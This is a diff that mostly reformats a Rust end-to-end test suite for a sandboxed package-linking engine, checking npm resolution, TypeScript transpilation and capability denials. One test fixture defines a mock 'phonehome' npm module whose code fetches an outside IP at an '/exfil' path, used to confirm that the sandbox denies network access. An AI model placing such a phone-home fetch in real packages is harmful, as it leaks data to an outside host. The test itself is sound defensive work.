@@ -3,7 +3,7 @@
 // Licensed under the Business Source License 1.1.
 // Change Date: 4 years after this version's release. Change License: Apache-2.0.
 
-//! Linked packages e2e — the virtual-filesystem composition
+//! Linked packages e2e - the virtual-filesystem composition
 //! (`Afb::linked_source`) running through the REAL engine invoke path
 //! (`register` + `run`, the same path burndb's `burn.invoke` rides).
 //!
@@ -18,14 +18,14 @@
 //!    at virtual `node_modules` (NOT packed in the .afb);
 //!  * dependency packages: bare `require('ns/dep')` resolved through
 //!    `__afb_links` to a digest-pinned dependency under `/afb/burn_modules`;
-//!  * SECURITY: composed code runs under the ROOT manifold — network from
+//!  * SECURITY: composed code runs under the ROOT manifold - network from
 //!    an npm dep is DENIED when the manifold grants none; a native artifact
 //!    in a resolved npm tree is rejected; a virtual miss is MODULE_NOT_FOUND
-//!    (never a host-fs EACCES — `/afb/…` never reaches the fs bridge).
+//!    (never a host-fs EACCES - `/afb/…` never reaches the fs bridge).
 
 use afterburner::{Afterburner, FsAccess, Manifold};
 use afterburner_afb::pack::Builder;
-use afterburner_afb::{hex, Afb, AfbError, Manifest};
+use afterburner_afb::{Afb, AfbError, Manifest, hex};
 use serde_json::json;
 use std::collections::BTreeMap;
 
@@ -63,7 +63,10 @@ fn npm_tree(files: &[(&str, &str)]) -> BTreeMap<String, Vec<u8>> {
 }
 
 const LEFTPAD: &[(&str, &str)] = &[
-    ("package.json", "{ \"name\": \"leftpad\", \"version\": \"1.0.0\", \"main\": \"index.js\" }"),
+    (
+        "package.json",
+        "{ \"name\": \"leftpad\", \"version\": \"1.0.0\", \"main\": \"index.js\" }",
+    ),
     (
         "index.js",
         "module.exports = function (s, n) { s = String(s); while (s.length < n) s = '0' + s; return s; };",
@@ -90,7 +93,10 @@ fn multi_file_package_requires_siblings() {
                 "source/main.js",
                 "const util = require('./util');\nmodule.exports = (d) => util.add(d.a, d.b);",
             ),
-            ("source/util.js", "module.exports = { add: (a, b) => a + b };"),
+            (
+                "source/util.js",
+                "module.exports = { add: (a, b) => a + b };",
+            ),
         ],
         &[],
     );
@@ -117,7 +123,9 @@ fn npm_package_resolves_from_resolved_tree() {
     );
     assert!(!afb.source.keys().any(|k| k.contains("node_modules")));
     let tree = npm_tree(LEFTPAD);
-    let src = afb.linked_source(&[], &[("leftpad", &tree)]).expect("linked");
+    let src = afb
+        .linked_source(&[], &[("leftpad", &tree)])
+        .expect("linked");
     let ab = sealed_engine();
     let id = ab.register(&src).expect("register");
     let out = ab.run(&id, &json!({ "s": "7", "n": 4 })).expect("run");
@@ -156,7 +164,7 @@ fn dependency_package_links_by_coordinate() {
 #[test]
 fn npm_network_is_denied_under_sealed_manifold() {
     // An npm dep tries to reach the network. The root package grants
-    // nothing — the attempt must surface as a denial. Capability gates
+    // nothing - the attempt must surface as a denial. Capability gates
     // apply to dependency code exactly as to first-party code.
     let afb = pack(
         "t",
@@ -171,10 +179,18 @@ fn npm_network_is_denied_under_sealed_manifold() {
         &[],
     );
     let tree = npm_tree(&[
-        ("package.json", "{ \"name\": \"phonehome\", \"version\": \"1.0.0\", \"main\": \"index.js\" }"),
-        ("index.js", "module.exports = function () { return fetch('http://93.184.216.34/exfil'); };"),
+        (
+            "package.json",
+            "{ \"name\": \"phonehome\", \"version\": \"1.0.0\", \"main\": \"index.js\" }",
+        ),
+        (
+            "index.js",
+            "module.exports = function () { return fetch('http://93.184.216.34/exfil'); };",
+        ),
     ]);
-    let src = afb.linked_source(&[], &[("phonehome", &tree)]).expect("linked");
+    let src = afb
+        .linked_source(&[], &[("phonehome", &tree)])
+        .expect("linked");
     let ab = sealed_engine();
     let id = ab.register(&src).expect("register");
     let out = ab.run(&id, &json!({})).expect("run completes");
@@ -187,7 +203,7 @@ fn npm_network_is_denied_under_sealed_manifold() {
 
 #[test]
 fn native_artifact_in_npm_tree_is_rejected_at_link() {
-    // A resolved npm tree carrying a native addon must fail composition —
+    // A resolved npm tree carrying a native addon must fail composition -
     // the WASM sandbox can never load it (defense at link time, in case
     // install-time rejection were ever bypassed).
     let afb = pack(
@@ -211,7 +227,7 @@ fn native_artifact_in_npm_tree_is_rejected_at_link() {
 #[test]
 fn virtual_miss_is_module_not_found_not_eacces() {
     // A miss inside the virtual tree must NOT consult the host fs (which
-    // is fully denied here) — the error is Node's MODULE_NOT_FOUND, not a
+    // is fully denied here) - the error is Node's MODULE_NOT_FOUND, not a
     // manifold EACCES. Proves '/afb/…' paths never cross the fs bridge.
     let afb = pack(
         "t",
@@ -251,14 +267,11 @@ fn typescript_source_transpiles_then_imports_npm() {
     let js_src = afterburner::ts::transpile(ts_src, Path::new("source/main.ts"))
         .expect("transpile TS -> JS");
     // packed package ships the transpiled JS as its entry
-    let afb = pack(
-        "t",
-        "tsuser",
-        &[("source/main.js", js_src.as_str())],
-        &[],
-    );
+    let afb = pack("t", "tsuser", &[("source/main.js", js_src.as_str())], &[]);
     let tree = npm_tree(LEFTPAD);
-    let src = afb.linked_source(&[], &[("leftpad", &tree)]).expect("linked");
+    let src = afb
+        .linked_source(&[], &[("leftpad", &tree)])
+        .expect("linked");
     let ab = sealed_engine();
     let id = ab.register(&src).expect("register");
     let out = ab.run(&id, &json!({ "s": "5", "n": 3 })).expect("run");
